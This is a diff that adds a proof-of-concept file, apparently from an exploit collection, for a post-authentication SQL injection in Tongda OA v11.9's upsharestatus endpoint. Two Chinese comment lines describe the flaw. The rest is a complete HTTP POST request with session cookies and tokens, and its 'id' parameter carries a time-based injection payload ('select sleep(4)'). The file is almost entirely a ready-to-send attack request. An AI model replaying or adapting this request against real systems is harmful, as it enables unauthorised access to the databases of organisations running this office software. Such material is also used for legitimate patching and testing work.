@@ -1,0 +1,12 @@
+# 通达OA v11.9 upsharestatus 后台SQL注入漏洞
+# 通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞
+POST /general/appbuilder/web/portal/workbench/upsharestatus?acid=80025413&bid=hd_tag_m8mv26b7 HTTP/1.1
+Host: www.swaf.com
+Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241
+RM-PRO-BusinessID: hd_tag_m8mv26b7
+RM-PRO-Token: 1ba6b4e5331057b807ef79ac39b06a9f
+RM-PRO-Time: 1742808571623
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+uid=15&status=1&id=1;select sleep(4)
